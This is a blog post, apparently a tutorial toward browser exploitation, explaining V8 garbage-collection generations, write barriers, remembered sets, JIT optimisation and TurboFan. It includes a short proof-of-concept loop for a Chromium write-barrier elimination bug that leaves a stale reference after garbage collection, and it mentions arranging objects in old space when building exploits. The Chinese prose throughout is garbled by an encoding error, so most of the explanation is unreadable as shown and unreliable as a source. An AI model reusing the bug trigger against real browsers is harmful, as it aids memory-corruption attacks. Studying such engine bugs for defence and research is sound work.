Spaceå·²ç»æ»¡äº†ï¼Œç°åœ¨æ–°åˆ›å»ºäº†ä¸€ä¸ªobject-slothï¼ŒTo Spaceå†…éƒ¨å¦‚ä¸‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">To: obj-a | obj-b | obj-c | ... | obj-end |        </span><br><span class="line">From: Empty</span><br></pre></td></tr></table></figure></div></li><li><p>æ˜¾ç„¶To Spaceæ”¾ä¸ä¸‹äº†ï¼Œå› æ­¤æŠŠTo Spaceçš„å†…å®¹å’ŒFrom Spaceäº¤æ¢(å› ä¸ºFrom Spaceæ˜¯ç©ºçš„ï¼Œç›¸å½“äºæ¸…ç©ºToSpace)ï¼Œç„¶ååœ¨From Spaceä¸­ä¾æ¬¡åˆ¤æ–­æ¯ä¸ªObjectæ˜¯å¦å­˜æ´»ï¼Œæ¯”å¦‚ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">To: Empty</span><br><span class="line">From: obj-a(alive,root) | obj-b(deadâŒ) | obj-c(alive,noroot) | ... | obj-end(alive) | </span><br></pre></td></tr></table></figure></div></li><li><p>æŠŠFrom Spaceä¸­aliveçš„Objectå¤åˆ¶åˆ°To Spaceä¸­ï¼Œæ¸…ç©ºFrom spaceï¼Œç„¶åå†é‡æ–°åˆ†é…åˆšåˆšåˆ›å»ºçš„obj-sloth</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">To: obj-a | obj-c | ... | obj-end | obj-sloth |     </span><br><span class="line">From: Empty</span><br></pre></td></tr></table></figure></div></li></ul></li></ul><blockquote><p>æ€ä¹ˆåˆ¤æ–­objectæ˜¯å¦æ˜¯aliveï¼ŸğŸ¤”</p><ul><li>é¦–å…ˆroot objectsè‚¯å®šæ˜¯aliveçš„ï¼Œä¸»è¦åŒ…æ‹¬global objects, built-in objects, local objects within the scope of livingç­‰</li><li>ä»Old Spaceï¼ˆè¿™å—åœ¨Old Generationä¸­ï¼Œåé¢ä¼šæåˆ°ï¼‰ä¸­å¯ä»¥è®¿é—®çš„objectä¹Ÿæ˜¯aliveçš„</li></ul></blockquote><h3 id="Old-Generation"><a href="#Old-Generation" class="headerlink" title="Old Generation"></a>Old Generation</h3><p>ç»“æ„å¦‚ä¸‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[Old Generation] --&gt; B[Old Space]</span><br><span class="line">    A --&gt; C[Code Space]</span><br><span class="line">    A --&gt; D[Map Space]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><ul><li><p>Old Spaceä¸»è¦ç”¨æ¥å­˜æ”¾é•¿æœŸaliveçš„Object</p><ul><li>åœ¨Young Generationçš„New Spaceä¸­ï¼Œç»è¿‡ä¸¤æ¬¡GCä»ä¿ç•™çš„objectå°±ä¼šå­˜åˆ°old spaceä¸­</li><li>old spaceå‘ç”ŸGCçš„é¢‘ç‡æ¯”new spaceå°å¾ˆå¤šï¼Œå› æ­¤åé¢æ„é€ expçš„æ—¶å€™ç”¨äºå†…å­˜å¸ƒå±€çš„objectå¯ä»¥å…ˆæ”¾åˆ°old spaceä¸­ï¼ˆä¹‹å‰å†™*CTF oob expä¸­å…ˆè¿›è¡Œä¸¤æ¬¡GCçš„åŸå› ï¼‰</li></ul></li><li><p>Code Space</p><ul><li>ä¸»è¦æ˜¯æ”¾code objectçš„ï¼Œ<strong>Code Object</strong> æ˜¯ V8 ä¸­ç”¨äºå­˜å‚¨<strong>ç”Ÿæˆçš„æœºå™¨ä»£ç </strong>çš„æ•°æ®ç»“æ„</li><li>å¯èƒ½æ–°æ‰‹çœ‹åˆ°è¿™é‡Œä¼šæœ‰ç–‘é—®ğŸ¤”ï¼Œä¸ºä»€ä¹ˆV8è¦è®¾è®¡ä¸€ä¸ªå­˜å‚¨æœºå™¨ä»£ç çš„objectï¼Œè¿™ä¸ªä¸»è¦æ¶‰åŠJITä¼˜åŒ–ï¼ŒV8ä¼šå°†JavaScriptå‡½æ•°ï¼ˆä¸€èˆ¬æ˜¯hot codeï¼‰ç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼Œä¼˜åŒ–ä¸ºæœºå™¨ç åï¼ˆJITä¼˜åŒ–ï¼‰ï¼Œè¿™äº›ä»£ç ç‰‡æ®µä¼šè¢«å­˜å‚¨ä¸º Code Objectï¼Œä¹‹åå†é‡åˆ°è¯¥å‡½æ•°è°ƒç”¨å¯ä»¥ç›´æ¥è¿è¡Œæœºå™¨ç ï¼Œé€Ÿåº¦æ›´å¿«ã€‚</li><li>è¿™é‡Œé¢çš„code objectä¸»è¦æ˜¯JITä¼˜åŒ–äº§ç”Ÿçš„ï¼Œç”±äºæ˜¯JITä¼˜åŒ–éƒ½æ˜¯è¿è¡Œæ—¶çš„ï¼Œæ‰€ä»¥å¯¹åº”çš„code objectæ‰€åœ¨å†…å­˜åŒºåŸŸä¹Ÿéœ€è¦æœ‰<strong>rwxæƒé™</strong></li></ul></li><li><p>Map Space</p><ul><li>Map Objectå°±æ˜¯ä¹‹å‰æåˆ°çš„Hidden Class(Map)</li></ul></li></ul><blockquote><p>Old generationä¸­GCä½¿ç”¨çš„æ˜¯Mark-Sweep-Compactç®—æ³•ï¼Œä½†åç»­åˆ©ç”¨ä¸­ä¸æ¶‰åŠï¼Œæ„Ÿå…´è¶£å¯ä»¥çœ‹</p><p><a class="link"   href="https://fa1lr4in.com/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/" >https://fa1lr4in.com/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><p>é‡Œé¢æ˜¯ä¸€ä¸ªLarge Object Spaceï¼Œæ”¾600KBåŠä»¥ä¸Šçš„object</p><blockquote><p>è¿™äº›Large Objectæœ‰ä»¥ä¸‹ç‰¹ç‚¹</p><ul><li>ä¸æ˜¯é€šè¿‡Heapåˆ†é…çš„ï¼Œè€Œæ˜¯mmapç›´æ¥åˆ†é…çš„</li><li>å†…å­˜ä½ç½®æ˜¯å›ºå®šçš„ï¼Œåœ¨åƒåœ¾å›æ”¶ï¼ˆGCï¼‰è¿‡ç¨‹ä¸­ï¼Œæ™®é€šObjectå¯èƒ½ä¼šè¢«å¤åˆ¶æˆ–ç§»åŠ¨åˆ°æ–°çš„å†…å­˜ä½ç½®ä»¥è¿›è¡Œæ•´ç†ï¼Œè€ŒLarge Objectç”±äºä½“ç§¯åºå¤§ï¼Œå› æ­¤å®ƒä»¬<strong>ä¸å‚ä¸ç§»åŠ¨</strong>ã€‚</li><li>å¦‚æœ Large Object Space ä¸­éœ€è¦å­˜æ”¾å¤šä¸ªå¯¹è±¡ï¼Œè¿™äº›å†…å­˜å—ä¼šä½¿ç”¨é“¾è¡¨è¿›è¡Œç®¡ç†</li></ul></blockquote><h3 id="Write-Barrier-amp-Remember-Set"><a href="#Write-Barrier-amp-Remember-Set" class="headerlink" title="Write Barrier &amp; Remember Set"></a>Write Barrier &amp; Remember Set</h3><p>ğŸ¤”æƒ³è±¡è¿™æ ·ä¸€ç§æƒ…å†µï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“Old Generationä¸­æ”¾çš„æ˜¯é•¿æœŸå­˜æ´»çš„Object(ä¸ºäº†æ–¹ä¾¿ï¼Œåé¢å°±ç§°è¿™ç±»objectä¸º<code>old-obj</code>)ï¼Œä½†å¦‚æœæˆ‘ä»¬ç°åœ¨è§¦å‘äº†GCï¼Œéœ€è¦å›æ”¶åœ¨Young Generationçš„ä¸€ä¸ª<code>young-obj</code>ï¼Œè€Œæ°å¥½æœ‰ä¸€ä¸ª<code>old-obj</code>å¼•ç”¨äº†è¿™ä¸ª<code>young-obj</code>ã€‚</p><p>é‚£ä¹ˆä¸ºäº†é˜²æ­¢æ‚¬æŒ‚æŒ‡é’ˆ(Dangling Pointer)ï¼Œä¹Ÿå°±æ˜¯<code>young-obj</code>å·²ç»è¢«å›æ”¶äº†ï¼Œè€Œé‚£ä¸ª<code>old-obj</code>çš„å¼•ç”¨æŒ‡é’ˆä»ç„¶æŒ‡å‘å·²è¢«æ¸…ç†çš„å†…å­˜ç©ºé—´ï¼Œå› æ­¤éœ€è¦æ›´æ–°<code>old-obj</code>çš„å¼•ç”¨æŒ‡é’ˆã€‚</p><blockquote><p>ğŸ§ è¿™é‡Œå¯èƒ½æœ‰ä¸ªç–‘é—®ï¼ŒOld Generationä¸­ä¸éƒ½æ˜¯ç»è¿‡2è½®GCå­˜æ´»ä¸‹æ¥çš„objectå—ï¼Œæ€ä¹ˆè¿˜ä¼šæŒ‡å‘æ–°åˆ›å»ºçš„åœ¨Young Generationä¸­çš„æ–°objectï¼Œè¿™é‡Œå…¶å®å°±æ˜¯ä¸€ä¸ª<strong>è·¨ä»£å¼•ç”¨</strong></p><h4 id="è·¨ä»£å¼•ç”¨"><a href="#è·¨ä»£å¼•ç”¨" class="headerlink" title="è·¨ä»£å¼•ç”¨"></a>è·¨ä»£å¼•ç”¨</h4><p>åœ¨ JavaScript ç¨‹åºä¸­ï¼Œè¿è¡Œæ—¶å¯èƒ½ä¼šä¿®æ”¹å¯¹è±¡çš„å±æ€§æˆ–ç»“æ„ï¼Œå¯¼è‡´ Old Generation çš„å¯¹è±¡æŒæœ‰ Young Generation çš„å¼•ç”¨ã€‚ä¾‹å¦‚ï¼š</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> oldObj = &#123;&#125;; </span><br><span class="line"><span class="comment">//....some code å¯¼è‡´ oldObj æœ€ç»ˆè¢«æå‡åˆ° Old Generation</span></span><br><span class="line"><span class="keyword">let</span> youngObj = &#123; <span class="attr">key</span>: <span class="string">&#x27;value&#x27;</span> &#125;; <span class="comment">// youngObj ä½äº Young Generation</span></span><br><span class="line">oldObj.<span class="property">ref</span> = youngObj; <span class="comment">// Old Generation çš„å¯¹è±¡å¼•ç”¨äº† Young Generation çš„å¯¹è±¡</span></span><br></pre></td></tr></table></figure></div></blockquote><p>é™¤äº†å›æ”¶è¿™ä¸ª<code>young-obj</code>çš„æƒ…å†µéœ€è¦æ›´æ–°å¯¹åº”<code>old-obj</code>çš„å¼•ç”¨æŒ‡é’ˆå¤–ï¼Œå…¶å®åªè¦å‘ç”ŸGCï¼Œä¹Ÿå¯èƒ½ç§»åŠ¨è¿™ä¸ª<code>young-obj</code>(å¯èƒ½æ˜¯ç®€å•çš„From-&gt;Toï¼Œä¹Ÿå¯èƒ½æ˜¯å‘ç”Ÿäº†â€æ™‹å‡â€)ï¼Œå¯¼è‡´æ”¹å˜å…¶å®é™…å†…å­˜åœ°å€ã€‚</p><blockquote><p>ğŸ’¡â€æ™‹å‡â€ğŸ”æ˜¯æŒ‡åœ¨Young Generationä¸­çš„<code>young-obj</code>ç»å†è¿‡çš„GCè½®æ•°è¾¾åˆ°è®¾å®šçš„é˜ˆå€¼ï¼Œå¯ä»¥è¢«è®¤ä¸ºæ˜¯é•¿æœŸå­˜æ´»çš„objectï¼Œå› æ­¤ç§»å…¥Old Generation</p></blockquote><p>é‚£ä¹ˆé’ˆå¯¹ä¸Šé¢è¯´çš„è¿™ç±»ç°è±¡ï¼Œæˆ‘ä»¬åœ¨å¯¹Young Generationè¿›è¡ŒGCå›æ”¶å¯¹è±¡æ—¶ï¼Œè¿˜éœ€è¦è®¿é—®Old Generationæ¥æ›´æ–°<code>old-obj</code>çš„å¼•ç”¨æŒ‡é’ˆï¼Œè¿™ä¼¼ä¹è¿èƒŒäº†è¿™ç§åˆ†ä»£è®¾è®¡çš„åˆè¡·ï¼ŒğŸ¤”ä¹‹æ‰€ä»¥è¦åˆ†æˆYoung Generationå’ŒOld Generationå°±æ˜¯ä¸ºäº†å‡å°‘objectçš„æ‰«ææ¬¡æ•°ä»è€ŒåŠ å¿«GCæ•ˆç‡ï¼Œå› æ­¤ä¸ºäº†è§£å†³è·¨ä»£å¼•ç”¨æ›´æ–°çš„é—®é¢˜ï¼Œå¼•å…¥äº†ä¸€ä¸ªå«è®°å½•é›†(Remember Set)çš„æ¦‚å¿µã€‚</p><p>ä»€ä¹ˆæ˜¯è®°å½•é›†ï¼Ÿå¯ä»¥ç®€å•ç†è§£ä¸ºï¼Œè®°å½•é›†å†…è®°å½•äº†æ‰€æœ‰<code>old-obj</code>æŒ‡å‘<code>young-obj</code>çš„æƒ…å†µï¼Œå…·ä½“å®ç°ä¸­è®°å½•é›†å†…å°±æ˜¯ä¸€ç»„æŒ‡å‘æœ‰è·¨ä»£å¼•ç”¨çš„<code>old-obj</code>çš„æŒ‡é’ˆã€‚å› æ­¤æˆ‘ä»¬åœ¨å¯¹Young Generationè¿›è¡ŒGCæ—¶ï¼Œå¯ä»¥é€šè¿‡è®¿é—®è®°å½•é›†æ¥å¿«é€Ÿä¿®æ”¹å¼•ç”¨æƒ…å†µï¼Œä¸‹å›¾æ˜¯ä¸€ä¸ªæ›´æ–°è·¨ä»£å¼•ç”¨çš„ç¤ºä¾‹(åŒæ—¶å‘ç”Ÿäº†<code>young-obj</code>çš„â€æ™‹å‡â€ğŸ”)</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241117175832676.png"                      alt="image-20241117175832676"                ><figcaption>image-20241117175832676</figcaption></figure></p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ä¸‹é¢çš„æµç¨‹å›¾æ¥è¡¨ç¤ºè¿™ä¸ªè¿‡ç¨‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[è§¦å‘æ–°ç”Ÿä»£GC] --&gt; B[æ‰«æè®°å½•é›†]</span><br><span class="line">    B --&gt; C[å°†è®°å½•é›†ä¸­çš„è€å¹´ä»£å¯¹è±¡ä½œä¸ºæ ¹å¯¹è±¡]</span><br><span class="line">    C --&gt; D[æ£€æŸ¥è€å¹´ä»£å¯¹è±¡å¼•ç”¨çš„æ–°ç”Ÿä»£å¯¹è±¡]</span><br><span class="line">    D --&gt; E&#123;ç›®æ ‡å¯¹è±¡å­˜æ´»çŠ¶æ€&#125;</span><br><span class="line">    </span><br><span class="line">    E --&gt;|å­˜æ´»| F[å¤åˆ¶åˆ°æ–°ç”Ÿä»£çš„To-Space]</span><br><span class="line">    E --&gt;|å·²æ™‹å‡| G[æ›´æ–°åˆ°è€å¹´ä»£]</span><br><span class="line">    E --&gt;|æœªå­˜æ´»| H[å›æ”¶ç›®æ ‡å¯¹è±¡]</span><br><span class="line">    </span><br><span class="line">    F --&gt; I[æ›´æ–°è€å¹´ä»£å¯¹è±¡çš„å¼•ç”¨æŒ‡é’ˆ]</span><br><span class="line">    H --&gt; I</span><br><span class="line">    G --&gt; I</span><br><span class="line">    I --&gt; J[å®Œæˆå¼•ç”¨å…³ç³»æ›´æ–°]</span><br><span class="line">    J --&gt; K[å›æ”¶æ–°ç”Ÿä»£çš„æœªå¼•ç”¨å¯¹è±¡]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>ğŸ¤“ğŸ‘†ğŸ»é‚£ä¹ˆç°åœ¨è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬è¯¥æ€ä¹ˆå½¢æˆè¿™ä¸ªè®°å½•é›†ğŸ¤”ï¼Œè¿™é‡Œå°±åˆè¦å¼•å…¥ä¸€ä¸ªå†™å…¥å±éšœ(Write Barrier)çš„æ¦‚å¿µï¼Œåœ¨æ›´æ–°å¯¹è±¡é—´çš„æŒ‡é’ˆæ—¶å€™(å‘ç”Ÿå¼•ç”¨å…³ç³»å˜åŒ–ï¼Œæ¯”å¦‚æ‰§è¡Œ<code>obj.x=...</code>)ï¼Œå°±ä¼šè§¦å‘write_barrierï¼Œå…¶å®ç°çš„ä»£ç é€»è¾‘å¦‚ä¸‹</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">write_barrier</span>(obj, field, new_obj)&#123;</span><br><span class="line"><span class="keyword">if</span>(obj &gt;= $old_start &amp;&amp; new_obj &lt; $old_start &amp;&amp; obj.remembered == FALSE)&#123;</span><br><span class="line">    $rs[$rs_index] = obj</span><br><span class="line">    $rs_index++</span><br><span class="line">    obj.remembered = TRUE</span><br><span class="line">  &#125;</span><br><span class="line">  *field = new_obj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>å‚æ•° obj æ˜¯å‘å‡ºå¼•â½¤çš„å¯¹è±¡ï¼Œobj å†…å­˜åœ¨è¦æ›´æ–°çš„æŒ‡é’ˆï¼Œâ½½ field æŒ‡çš„å°±æ˜¯ obj å†…çš„åŸŸï¼Œnew_obj æ˜¯åœ¨æŒ‡é’ˆæ›´æ–°åæˆä¸ºå¼•â½¤â½¬æ ‡çš„å¯¹è±¡ã€‚</p><p>ä¸‰ä¸ªåˆ¤æ–­æ¡ä»¶</p><ul><li>å‘å‡ºå¼•â½¤çš„å¯¹è±¡æ˜¯ä¸æ˜¯<code>old-obj</code></li><li>æŒ‡é’ˆæ›´æ–°åçš„å¼•â½¤çš„â½¬æ ‡å¯¹è±¡æ˜¯ä¸æ˜¯<code>young-obj</code></li><li>å‘å‡ºå¼•â½¤çš„å¯¹è±¡æ˜¯å¦è¿˜æ²¡æœ‰è¢«è®°å½•åˆ°è®°å½•é›†ä¸­</li></ul><p>å¦‚æœè¿™äº›æ¡ä»¶éƒ½æ»¡â¾œï¼Œå°±å°†<code>old-obj</code>å†™â¼Šåˆ°è®°å½•é›†â¾¥ï¼Œæœ€å<code>*field = new_obj</code>æ›´æ–°æŒ‡é’ˆ</p><p>ğŸ’¡è¿™é‡Œå¯ä»¥å‘ç°è¿™ä¸ªæŒ‡é’ˆæ›´æ–°çš„æ“ä½œæ˜¯ä¸€å®šå‘ç”Ÿçš„(åœ¨ifæ¡ä»¶å¤–)ï¼Œå› æ­¤æœ‰ä¸ªæ¯”è¾ƒå…¸å‹çš„æ¼æ´ï¼Œ<strong>åœ¨æ›´æ–°æŒ‡é’ˆçš„æ—¶å€™ï¼Œé”™è¯¯çš„æ¶ˆé™¤äº†</strong>Write Barrierï¼Œå³åªæ›´æ–°æŒ‡é’ˆï¼Œä¸æ£€æŸ¥æ˜¯å¦è¯¥æŠŠ<code>old-obj</code>å†™â¼Šåˆ°è®°å½•é›†â¾¥ï¼ˆè¿™æ ·å°±ä¼šå¯¼è‡´åé¢å‘ç”ŸGCæ—¶ä¸æ›´æ–°è¿™ä¸ª<code>old-obj</code>çš„å¼•ç”¨å…³ç³»ï¼Œå‘ç”ŸUAFï¼‰ã€‚</p><p><a class="link"   href="https://bugs.chromium.org/p/chromium/issues/detail?id=791245" >https://bugs.chromium.org/p/chromium/issues/detail?id=791245 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>å…¶å®å°±æ˜¯JITçš„é”…ï¼Œå› ä¸ºV8ä¸­Objectè¿˜æœ‰smiçš„å­˜åœ¨ï¼Œæ‰€ä»¥JITè®¤ä¸ºsmiä¸ç”¨å†™å±éšœ(å› ä¸ºå®ƒå°±æ²¡æœ‰propertyï¼Œä¹Ÿä¸èƒ½è¿›è¡Œ<code>obj.x=...</code>çš„æ“ä½œ)</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> v; <span class="comment">// should be var</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">700000</span>; i++) &#123;</span><br><span class="line">    arr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    v = i + -<span class="number">0</span>;</span><br><span class="line">    arr[<span class="number">0</span>] = v;<span class="comment">//æ›´æ–°arrè¿™ä¸ªobjçš„å¼•ç”¨å…³ç³»ï¼Œä½†æ˜¯JITæŠŠè¿™é‡Œçš„å†™å±éšœæ¶ˆé™¤äº†</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">print</span>(arr[<span class="number">0</span>] === v) <span class="comment">// true</span></span><br><span class="line"><span class="title function_">gc</span>();<span class="comment">//gcä¹‹åarr[0]-&gt;vçš„å¼•ç”¨ä¸¢å¤±äº†ï¼ŒåŸæ¥æŒ‡çš„é‚£ä¸ªvå·²ç»è¢«ç§»åŠ¨äº†ï¼Œä½†æ²¡æ›´æ–°arrå¯¹vçš„å¼•ç”¨</span></span><br><span class="line"><span class="title function_">print</span>(arr[<span class="number">0</span>] === v) <span class="comment">// false</span></span><br></pre></td></tr></table></figure></div></blockquote><h2 id="0x02-ç¼–è¯‘ä¼˜åŒ–â©"><a href="#0x02-ç¼–è¯‘ä¼˜åŒ–â©" class="headerlink" title="0x02 ç¼–è¯‘ä¼˜åŒ–â©"></a>0x02 ç¼–è¯‘ä¼˜åŒ–â©</h2><h3 id="JITæ¦‚è¿°"><a href="#JITæ¦‚è¿°" class="headerlink" title="JITæ¦‚è¿°"></a>JITæ¦‚è¿°</h3><p>å‚è€ƒ<a class="link"   href="https://hacks.mozilla.org/2017/02/a-crash-course-in-just-in-time-jit-compilers/" >https://hacks.mozilla.org/2017/02/a-crash-course-in-just-in-time-jit-compilers/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ä»¥ç±»å‹ä¿æŠ¤ä¸ºä¾‹ï¼ŒV8ä¸­Js codeçš„æ‰§è¡Œæµç¨‹å›¾ç±»ä¼¼ä¸‹å›¾</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[JavaScript Source Code] --&gt; C[Abstract Syntax Tree]</span><br><span class="line">    C --&gt; D[Interpreter Ignition]</span><br><span class="line">    E[&quot;Compiler TurboFan(JIT)ğŸŒŸ&quot;]</span><br><span class="line">    D --&gt; F[Bytecode]</span><br><span class="line">    E --&gt; G[Optimized Machine Code]</span><br><span class="line">    D -.-&gt; E</span><br><span class="line">    G -.-&gt; F</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>jsæ˜¯åŠ¨æ€ç±»å‹è¯­è¨€ï¼Œå˜é‡åªæœ‰åœ¨è¿è¡Œæ—¶æ‰èƒ½ç¡®å®šç±»å‹ï¼Œå› æ­¤éœ€è¦åšå¾ˆå¤šç±»å‹æ£€æŸ¥(å¦‚ä¸‹å›¾)ï¼ŒJITä¼šå‚ä¸å…¶ä¸­çš„ä¼˜åŒ–ã€‚</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241117175902132.png"                      alt="image-20241117175902132"                ><figcaption>image-20241117175902132</figcaption></figure></p><h4 id="ä»€ä¹ˆæ—¶å€™ä¼˜åŒ–ï¼Ÿ"><a href="#ä»€ä¹ˆæ—¶å€™ä¼˜åŒ–ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ—¶å€™ä¼˜åŒ–ï¼Ÿ"></a>ä»€ä¹ˆæ—¶å€™ä¼˜åŒ–ï¼Ÿ</h4><p>å½“æŸè¡Œä»£ç è¢«é‡å¤æ‰§è¡Œ(æˆ–æ‰§è¡Œæ¬¡æ•°è¾¾åˆ°ä¸€å®šé˜ˆå€¼)åï¼Œä»£ç ä¼šè¢«ä¼ ç»™JIT compilerè¿›è¡Œä¼˜åŒ–ã€‚</p><h4 id="æ€ä¹ˆä¼˜åŒ–ï¼Ÿ"><a href="#æ€ä¹ˆä¼˜åŒ–ï¼Ÿ" class="headerlink" title="æ€ä¹ˆä¼˜åŒ–ï¼Ÿ"></a>æ€ä¹ˆä¼˜åŒ–ï¼Ÿ</h4><p>JITä¼šå¯¹è¿™äº›å˜é‡çš„ç±»å‹åšå‡ºå‡è®¾ï¼Œåˆ é™¤å†—ä½™çš„ç±»å‹æ£€æŸ¥ï¼Œåªä¿ç•™ä¸å‡è®¾å¯¹åº”çš„ï¼ŒåŒæ—¶ä¹Ÿä¸Šäº†â€œä¿é™©ğŸ”’â€ï¼ˆç±»å‹ä¿æŠ¤ï¼‰ï¼Œå‡è®¾ä¸æˆç«‹çš„è¯å°±æ‰“å›åˆ°ä¼˜åŒ–å‰çš„ç‰ˆæœ¬ï¼ˆå¯èƒ½æ˜¯è§£é‡Šå™¨&#x2F;å…¶ä»–baseline compilerï¼‰</p><h4 id="æ€ä¹ˆåšåˆç†çš„å‡è®¾ï¼Ÿ"><a href="#æ€ä¹ˆåšåˆç†çš„å‡è®¾ï¼Ÿ" class="headerlink" title="æ€ä¹ˆåšåˆç†çš„å‡è®¾ï¼Ÿ"></a>æ€ä¹ˆåšåˆç†çš„å‡è®¾ï¼Ÿ</h4><p>ä¸â€œæ¦‚ç‡â€æœ‰å…³ï¼ŒJITé€šè¿‡å¯¹<strong>å¤šæ¬¡æ‰§è¡Œçš„ä»£ç çš„ç¼–è¯‘ç»“æœçš„å­˜å‚¨ï¼Œæ¥å®ç°å¯¹å˜é‡ç±»å‹çš„åˆç†æ¨æµ‹</strong>ï¼ŒåŸæ–‡â¬‡ï¸</p><blockquote><p>The optimizing compiler <strong>uses the information the monitor has gathered by watching code execution to make these judgments</strong>. If something has been true for all previous passes through a loop, it assumes it will continue to be true.</p></blockquote><p>ğŸ¤”ä¹Ÿè®¸ä½¿ç”¨å¾ªç¯å¯èƒ½å¯ä»¥â€œæ¬ºéª—â€JITåšå‡ºä¸€äº›ä¼˜åŒ–ï¼Œæˆ‘çŒœæµ‹FuzzJIT(Securityâ€™23)çš„ä½œè€…çµæ„Ÿä¹Ÿæ¥æºäºæ­¤ã€‚</p><h3 id="TurboFan-Pipelineï¼ˆV8ä¸­çš„JIT-æ‰¿æ‹…ä¸»è¦çš„ç¼–è¯‘ä¼˜åŒ–å·¥ä½œï¼‰"><a href="#TurboFan-Pipelineï¼ˆV8ä¸­çš„JIT-æ‰¿æ‹…ä¸»è¦çš„ç¼–è¯‘ä¼˜åŒ–å·¥ä½œï¼‰" class="headerlink" title="TurboFan Pipelineï¼ˆV8ä¸­çš„JIT æ‰¿æ‹…ä¸»è¦çš„ç¼–è¯‘ä¼˜åŒ–å·¥ä½œï¼‰"></a>TurboFan Pipelineï¼ˆV8ä¸­çš„JIT æ‰¿æ‹…ä¸»è¦çš„ç¼–è¯‘ä¼˜åŒ–å·¥ä½œï¼‰</h3><p>å¦‚ä¸‹å›¾</p><ul><li>é¦–å…ˆæ„é€ ASTã€Bytecodeï¼Œç„¶åinlineå®ƒä»¬çš„JavaScript Graph</li><li>ç®€åŒ–å¾—åˆ°çš„Graphï¼ŒåŒæ—¶è¿›è¡Œä¸€ä¸ªé™æ€çš„ç±»å‹åˆ†æï¼ŒåŒ…æ‹¬ç±»å‹æ¨æ–­ç­‰</li><li>è¿›è¡Œç±»å‹ä¼˜åŒ–ï¼Œå†ç®€åŒ–Graph</li><li>å†è¿›è¡Œä¸€äº›å…¶ä»–ä¼˜åŒ–ï¼ˆæ¯”å¦‚å†—ä½™èŠ‚ç‚¹æ¶ˆé™¤ã€å¾ªç¯ä¸å˜é‡å¤–æç­‰ï¼‰</li></ul><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241117175913086.png"                      alt="image-20241117175913086"                ><figcaption>image-20241117175913086</figcaption></figure></p><h3 id="Turbolizer"><a href="#Turbolizer" class="headerlink" 